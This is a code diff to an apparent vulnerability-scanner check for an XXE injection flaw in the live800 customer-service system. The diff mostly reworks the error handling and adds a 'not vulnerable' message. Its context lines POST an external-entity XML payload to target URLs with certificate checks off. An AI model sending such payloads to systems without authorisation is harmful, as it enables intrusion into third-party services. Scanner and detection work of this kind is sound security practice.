@@ -43,14 +43,18 @@ class live800_services_xxe_BaseVerify():
         }
         post_data = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "81dc9bdb52d04dc20036dbd8313ed055">%remote;]>'''
         vulnurls = self.catch_service()
-        for vulnurl in vulnurls:
-            try:
+        try:
+            noexist = True
+            for vulnurl in vulnurls:
                 req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在live800在线客服系统XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在live800_services_xxe漏洞", "white", "on_grey")
+        except:
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
-            except:
-                cprint("[-] "+__file__+"====>连接超时", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
